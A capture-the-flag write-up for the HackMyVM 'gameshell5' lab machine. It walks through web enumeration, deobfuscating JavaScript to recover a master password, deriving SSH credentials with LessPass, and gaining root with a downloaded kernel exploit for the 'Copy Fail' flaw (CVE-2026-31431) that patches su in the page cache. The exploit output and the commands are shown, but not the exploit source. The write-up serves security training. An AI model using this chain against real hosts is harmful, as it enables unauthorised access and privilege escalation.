# gameshell5

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| gameshell5 | sublarge | Beginner | HackMyVM |

**Summary:** The exploitation of the Gameshell5 machine follows a sophisticated path starting with network service discovery and culminating in a kernel level privilege escalation. Initial reconnaissance identifies a web server hosting an obfuscated JavaScript application and encoded CSS assets. Deobfuscation of the script reveals a master password and target site, while decoding a Base64 string from the stylesheet identifies the use of the LessPass password manager. These findings allow for the generation of valid SSH credentials for the user noob. Upon gaining initial access, local enumeration identifies a Linux kernel version vulnerable to the Copy Fail flaw, cataloged as CVE:2026:31431. The final stage involves the deployment of a detection script followed by a Python exploit that patches the page cache of the su binary, granting an interactive root shell and full system control.

---

**1. Reconnaissance and Network Discovery**

The assessment begins with a network scan to identify the target IP address within the local environment. A specialized PowerShell script is utilized for this purpose, locating the target at 192.168.100.198.

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.198 08:00:27:D5:60:43 VirtualBox
```

With the target identified, a comprehensive Nmap scan is performed to enumerate all open ports and determine the versions of running services.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gameshell5]
└─$ nmap -sCV -p- -T4 192.168.100.198
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-15 20:47 WIB
Nmap scan report for 192.168.100.198
Host is up (0.0026s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
| http-robots.txt: 4 disallowed entries
|_/*.js$ /*.js? /*.css$ /*.css?
|_http-title: Retro Bowl
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.63 seconds
```

**2. Web Enumeration and Directory Fuzzing**

The Nmap results indicate the presence of a robots.txt file. A manual request to this file reveals several disallowed entries, specifically targeting JavaScript and CSS files.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gameshell5]
└─$ curl -s 'http://192.168.100.198/robots.txt'
User-agent: *
Disallow: /*.js$
Disallow: /*.js?
Disallow: /*.css$
Disallow: /*.css?
```

An inspection of the index.html source code reveals an iframe pointing to an external site, along with some internal styling.

```javascript
        <title>Retro Bowl</title>
<iframe src="https://shellshock.io/?utm=chromeext" frameborder="0" scrolling="yes" width="100%" height="100%" loading="lazy"></iframe>

<style type="text/css">iframe { position: absolute; width: 100%; height: 100%; z-index: 999; }</style>
```

To find more hidden files or directories, a fuzzing tool named FFuf is employed using a standard directory list. This identifies the style.css and script.js files mentioned in robots.txt.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gameshell5]
└─$ ffuf -u http://192.168.100.198/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -e .js.sh,.css.sh,.js.cgi,.css.cgi,.js,.css -mc 200 -ic

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.198/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Extensions       : .js.sh .css.sh .js.cgi .css.cgi .js .css
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

                        [Status: 200, Size: 273, Words: 27, Lines: 5, Duration: 11ms]
style.css               [Status: 200, Size: 50645, Words: 49, Lines: 23, Duration: 27ms]
script.js               [Status: 200, Size: 13483, Words: 135, Lines: 2, Duration: 15ms]
```

**3. JavaScript Deobfuscation and CSS Analysis**

The script.js file is opened and found to be heavily obfuscated with complex variable names and function calls.

![](image.png)

A deobfuscation tool located at https://deobfuscate.relative.im/ is used to process the code. The resulting cleartext script reveals several constants, including a site name, a login name, and a master password.

```javascript
const _0x5ec362 = (function () {
    let _0x5dd057 = true
    return function (_0x1da175, _0x4d8a05) {
      const _0x56f4d9 = _0x5dd057
        ? function () {
            if (_0x4d8a05) {
              const _0x4ad646 = _0x4d8a05.apply(_0x1da175, arguments)
              return (_0x4d8a05 = null), _0x4ad646
            }
          }
        : function () {}
      return (_0x5dd057 = false), _0x56f4d9
    }
  })(),
  _0x498e99 = _0x5ec362(this, function () {
    return _0x498e99
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x498e99)
      .search('(((.+)+)+)+$')
  })
_0x498e99()
const _0x375364 = (function () {
    let _0x101ac0 = true
    return function (_0x40f6a5, _0x5447f2) {
      const _0x1412c6 = _0x101ac0
        ? function () {
            if (_0x5447f2) {
              const _0x5b6c2a = _0x5447f2.apply(_0x40f6a5, arguments)
              return (_0x5447f2 = null), _0x5b6c2a
            }
          }
        : function () {}
      return (_0x101ac0 = false), _0x1412c6
    }
  })(),
  _0x3562b9 = _0x375364(this, function () {
    const _0x159967 = function () {
        let _0x56e011
        try {
          _0x56e011 = Function(
            'return (function() {}.constructor("return this")( ));'
          )()
        } catch (_0x16304e) {
          _0x56e011 = window
        }
        return _0x56e011
      },
      _0x4764dd = _0x159967(),
      _0x3312b6 = (_0x4764dd.console = _0x4764dd.console || {}),
      _0x16224b = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (let _0x4e2610 = 0; _0x4e2610 < _0x16224b.length; _0x4e2610++) {
      const _0x266bd1 = _0x375364.constructor.prototype.bind(_0x375364),
        _0x3d3ade = _0x16224b[_0x4e2610],
        _0x37787e = _0x3312b6[_0x3d3ade] || _0x266bd1
      _0x266bd1['__proto__'] = _0x375364.bind(_0x375364)
      _0x266bd1.toString = _0x37787e.toString.bind(_0x37787e)
      _0x3312b6[_0x3d3ade] = _0x266bd1
    }
  })
_0x3562b9()
const site = 'shell-shockers.dsz'
const loginName = 'noob',
  masterPass = 'aBcDeFgHiJkLmNoP'
```

Following the JavaScript analysis, the style.css file is retrieved. It contains a very large Base64 encoded string defined as a background image.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gameshell5]
└─$ curl -i http://192.168.100.198/style.css
HTTP/1.1 200 OK
Date: Fri, 15 May 2026 14:57:55 GMT
Server: Apache/2.4.62 (Debian)
Last-Modified: Sun, 07 Dec 2025 09:08:15 GMT
ETag: "c5d5-6455904d0c91a"
Accept-Ranges: bytes
Content-Length: 50645
Vary: Accept-Encoding
Content-Type: text/css

body {
  margin: 0;
  padding: 0;
  background: #f5f5f5;
  background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAB+8AAAHLCAYAAAAJAdquAAAACXBIWXMAAC4jAAAuIwF4pT92AAAAGXRFWHRTb2Z0d2FyZQB3d3cuaW5rc2NhcGUub3Jnm+48GgAAIABJREFUeJzs3XeYXVXVx/HvpEwqKYSO0gSkd6TZQEQQkA5iA4GgWLCgL9gQFRVRsaKAioqIUhUQUCwoCnZRECmCAlIERFoIpM77x7pjJskkmXLvWad8P89znxlIcvfK5Mzcfc9v77W7enp6kNRRI4B1gI2B1YCVW
...
```

The encoded content is saved to a file and decoded back into a PNG image. This image serves as a significant hint for the next phase of exploitation.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gameshell5]
└─$ vim base64.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gameshell5]
└─$ base64 -d base64.txt > a.png

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gameshell5]
└─$ open a.png
```

![](image-1.png)

The hint points toward the LessPass password manager. By entering the previously discovered credentials (site: shell:shockers.dsz, user: noob, master password: aBcDeFgHiJkLmNoP) into the LessPass application at https://lesspass.com/, a valid password for SSH access is generated.

![](image-2.png)

**4. Initial Access via SSH**

The generated password is used to establish an SSH connection to the target machine as the user noob.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gameshell5]
└─$ ssh noob@192.168.100.198
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
noob@192.168.100.198's password:
Linux GameShell5 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri May 15 10:57:15 2026 from 192.168.100.1
noob@GameShell5:~$ id
uid=1000(noob) gid=1000(noob) groups=1000(noob),4(adm)
noob@GameShell5:~$ ls -la
total 28
drwx------  3 noob noob 4096 Dec 27 23:56 .
drwxr-xr-x 14 root root 4096 Dec 27 23:31 ..
lrwxrwxrwx  1 root root    9 Dec  1 10:25 .bash_history -> /dev/null
-rw-r--r--  1 noob noob  220 Apr 18  2019 .bash_logout
-rw-r--r--  1 noob noob 3526 Apr 18  2019 .bashrc
-rw-r--r--  1 noob noob  807 Apr 18  2019 .profile
drwx------  2 noob noob 4096 Dec 27 23:34 .ssh
-rw-r--r--  1 root root   44 Dec  1 10:25 user.txt
```

The user.txt flag is found within the home directory of the noob user.

**5. Internal Enumeration and Vulnerability Detection**

Upon gaining access, the system's kernel version is checked to identify potential vulnerabilities.

```bash
noob@GameShell5:~$ uname -r
4.19.0-27-amd64
```

The kernel version 4.19.0:27:amd64 is known to be vulnerable to the Copy Fail exploit. To confirm this, a detection script is downloaded from GitHub at https://github.com/liamromanis101/CVE-2026-31431-Copy-Fail---Vulnerability-Detection-Script and transferred to the machine.

```bash
noob@GameShell5:~$ wget http://192.168.100.1:8080/cve-2026-31431-detect.py
--2026-05-15 11:10:11--  http://192.168.100.1:8080/cve-2026-31431-detect.py
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 21529 (21K) [text/x-python]
Saving to: ‘cve-2026-31431-detect.py’

cve-2026-31431-detect.py  100%[==================================>]  21.02K  --.-KB/s    in 0.003s

2026-05-15 11:10:11 (7.71 MB/s) - ‘cve-2026-31431-detect.py’ saved [21529/21529]
```

Executing the detection script confirms that the system is indeed vulnerable.

```bash
noob@GameShell5:~$ python3 cve-2026-31431-detect.py
CVE-2026-31431 'Copy Fail' — Vulnerability Detection
authencesn page cache corruption / local privilege escalation
Running as uid=1000, euid=1000

Liam Romanis

  [INFO] Kernel config loaded from /boot/config-4.19.0-27-amd64

=== Kernel Version ===
  [INFO] Kernel release : 4.19.0-27-amd64
  [VULNERABLE] Kernel version
          Reason : Kernel is in the vulnerable range (4.10 – 6.14)
          Detail : Release: 4.19.0-27-amd64 — patch status must be confirmed

=== Patch Presence ===
  [INFO] Package info: dpkg: Desired=Unknown/Install/Remove/Purge/Hold
  [VULNERABLE] Patch presence
          Reason : Cannot confirm fix commit is present — treat as unpatched
          Detail : Compare installed kernel package version against your distro's security advisory for CVE-2026-31431

=== algif_aead Module ===
  [INFO] algif_aead is not currently loaded (may load on demand)
  [INFO] Module file on disk: /lib/modules/4.19.0-27-amd64/kernel/crypto/algif_aead.ko
  [VULNERABLE] algif_aead module
          Reason : Module is not loaded but will auto-load on AF_ALG bind() — no blacklist found, so it remains exploitable on demand

=== CONFIG_CRYPTO_AUTHENC (Kernel Config) ===
  [VULNERABLE] CONFIG_CRYPTO_AUTHENC
          Reason : Built as module (=m): authenc and authencesn auto-load on AF_ALG bind(); modprobe blacklist of algif_aead is the correct mitigation

=== CONFIG_CRYPTO_USER_API_AEAD (Kernel Config) ===
  [INFO] CONFIG_CRYPTO_USER_API_AEAD = m
  [VULNERABLE] CONFIG_CRYPTO_USER_API_AEAD
          Reason : AF_ALG AEAD interface is a loadable module — unprivileged users can access the crypto subsystem via AF_ALG sockets

=== AF_ALG Socket Availability ===
  [VULNERABLE] AF_ALG socket
          Reason : Unprivileged AF_ALG socket creation succeeded — crypto subsystem accessible without privileges

=== Python os.splice Availability ===
  [INFO] Python version: 3.9.2
  [OK] Python os.splice (pure-Python path)
          Reason : Python 3.9 < 3.10: os.splice() unavailable — pure-Python path blocked, but a C-based exploit remains trivial

=== Setuid Binary Exposure ===
  [INFO] Setuid binary present: /usr/bin/su (mode 0o104755, owner uid=0)
  [INFO] Setuid binary present: /usr/bin/sudo (mode 0o104755, owner uid=0)
  [INFO] Setuid binary present: /usr/bin/passwd (mode 0o104755, owner uid=0)
  [INFO] Setuid binary present: /usr/bin/newgrp (mode 0o104755, owner uid=0)
  [INFO] Setuid binary present: /usr/bin/chsh (mode 0o104755, owner uid=0)
  [INFO] Setuid binary present: /usr/bin/chfn (mode 0o104755, owner uid=0)
  [INFO] Setuid binary present: /usr/bin/gpasswd (mode 0o104755, owner uid=0)
  [INFO] Setuid binary present: /usr/bin/mount (mode 0o104755, owner uid=0)
  [INFO] Setuid binary present: /usr/bin/umount (mode 0o104755, owner uid=0)
  [INFO] Setuid binary present: /usr/bin/pkexec (mode 0o104755, owner uid=0)
  [VULNERABLE] Setuid binaries
          Reason : 10 setuid-root binaries present and readable — page cache of these files is a valid write target
          Detail : /usr/bin/su, /usr/bin/sudo, /usr/bin/passwd, /usr/bin/newgrp, /usr/bin/chsh, /usr/bin/chfn, /usr/bin/gpasswd, /usr/bin/mount, /usr/bin/umount, /usr/bin/pkexec

=== Mitigations ===
  [INFO] AppArmor appears active
  [INFO] SELinux not detected
  [INFO] This process seccomp mode: disabled
  [INFO] Note: LSM/seccomp mitigations above are process/policy-specific. The definitive mitigation is patching the kernel or blacklisting algif_aead.

=== Unprivileged User Namespaces ===
  [INFO] max_user_namespaces = 7865
  [INFO] unprivileged_userns_clone = 0
  [INFO] Note: CVE-2026-31431 exploits AF_ALG sockets directly and does NOT require user namespaces. Namespace restrictions do not block Copy Fail, but they reduce the broader local privilege escalation surface.

=== Transparent Hugepages (THP) ===
  [INFO] THP setting: [always] madvise never
  [INFO] THP=always: may affect page cache alignment. Some kernel versions show higher exploit reliability with THP enabled.

=== Environment Detection ===
  [INFO] Running as uid=1000, euid=1000

=== Summary ===

  SYSTEM IS LIKELY VULNERABLE TO CVE-2026-31431

  7 vulnerable condition(s) found:

  ✗ Kernel version
    Kernel is in the vulnerable range (4.10 – 6.14)

  ✗ Patch presence
    Cannot confirm fix commit is present — treat as unpatched

  ✗ algif_aead module
    Module is not loaded but will auto-load on AF_ALG bind() — no blacklist found, so it remains exploitable on demand

  ✗ CONFIG_CRYPTO_AUTHENC
    Built as module (=m): authenc and authencesn auto-load on AF_ALG bind(); modprobe blacklist of algif_aead is the correct mitigation

  ✗ CONFIG_CRYPTO_USER_API_AEAD
    AF_ALG AEAD interface is a loadable module — unprivileged users can access the crypto subsystem via AF_ALG sockets

  ✗ AF_ALG socket
    Unprivileged AF_ALG socket creation succeeded — crypto subsystem accessible without privileges

  ✗ Setuid binaries
    10 setuid-root binaries present and readable — page cache of these files is a valid write target

  1 mitigated/safe condition(s):

  ✓ Python os.splice (pure-Python path)
    Python 3.9 < 3.10: os.splice() unavailable — pure-Python path blocked, but a C-based exploit remains trivial


Recommended actions:
  1. Apply your distribution's kernel update for CVE-2026-31431
  2. Until patched, blacklist the module:
       echo 'install algif_aead /bin/false' > /etc/modprobe.d/disable-algif-aead.conf
       rmmod algif_aead 2>/dev/null
     NOTE: this is ONLY effective when CONFIG_CRYPTO_AUTHENC=m (module).
     If CONFIG_CRYPTO_AUTHENC=y (built-in), patching is the only fix.
  3. Verify fix: check distro security advisory for patched package version
  4. Monitor: https://github.com/torvalds/linux/commit/a664bf3d603d
```

**6. Privilege Escalation and Final Flags**

With the vulnerability confirmed, an exploit script is retrieved from https://github.com/SeanRickerd/cve-2026-31431. The script is transferred to the target and executed.

```bash
noob@GameShell5:~$ wget http://192.168.100.1:8080/exploit.py
--2026-05-15 11:15:14--  http://192.168.100.1:8080/exploit.py
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4040 (3.9K) [text/x-python]
Saving to: ‘exploit.py’

exploit.py                100%[==================================>]   3.95K  --.-KB/s    in 0s

2026-05-15 11:15:14 (462 MB/s) - ‘exploit.py’ saved [4040/4040]
```

The exploit script patches the page cache of the su binary, allowing for the execution of an interactive root shell.

```bash
noob@GameShell5:~$ python3 exploit.py
[*] CVE-2026-31431 Copy Fail Exploit
[*] Target: /usr/bin/su

[+] Opened /usr/bin/su (fd=3)
[+] Shellcode size: 160 bytes
[+] Patching /usr/bin/su in page cache...
    Written 16/160 bytes...
    Written 32/160 bytes...
    Written 48/160 bytes...
    Written 64/160 bytes...
    Written 80/160 bytes...
    Written 96/160 bytes...
    Written 112/160 bytes...
    Written 128/160 bytes...
    Written 144/160 bytes...
    Written 160/160 bytes...
[+] Page cache patching complete!
[+] Executing modified su...

# id
uid=0(root) gid=1000(noob) groups=1000(noob),4(adm)
# whoami
root
# hostname
GameShell5
# cat /home/noob/user.txt
flag{user-[REDACTED]fcc}
# cat /root/root.txt
flag{root-[REDACTED]b60}
```

Both the user and root flags are successfully retrieved, completing the system compromise.

---

## Attack Chain Summary
1. Reconnaissance: Initial network scanning identifies the target IP and open services including HTTP and SSH.
2. Vulnerability Discovery: Web enumeration reveals obfuscated JavaScript and encoded CSS assets that contain critical credential derivation hints.
3. Exploitation: Deriving the SSH password through the LessPass utility provides initial access to the system as the user noob.
4. Internal Enumeration: Checking the kernel version and deploying a detection script confirms the presence of the Copy Fail vulnerability.
5. Privilege Escalation: Executing a specialized exploit script patches the page cache of the su binary to grant full root access.

